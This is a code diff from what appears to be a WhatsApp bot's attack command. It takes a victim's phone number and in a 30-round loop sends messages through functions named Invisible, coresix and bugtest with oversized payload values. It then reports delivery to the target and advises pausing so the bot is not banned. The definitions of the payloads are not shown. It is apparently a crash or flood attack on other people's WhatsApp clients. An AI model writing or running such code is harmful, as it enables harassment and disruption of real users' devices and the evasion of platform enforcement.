@@ -1679,14 +1679,10 @@ if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> *Example*: ${prefix + command} 2547392784527`)
 let target = bijipler + '@s.whatsapp.net'
+await Invisible(target)
 for (let j = 0; j < 30; j++) {
-await Invisible(target)
-await bugtest(target, "", 1020000, true);
-await Invisible(target)
-await coresix(target, "", 1020000, true);
-await bugtest(target, "", 1020000, true);
-await Invisible(target);
-await bugtest(target, "", 1020000, true);
+await coresix(target, "SPIDER-V8", 1020000, true);
+await bugtest(target, "SPIDER-V8", 1020000, true);
 await sleep(500)
 }
 await reply(`_Successfully Spider has delivered to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
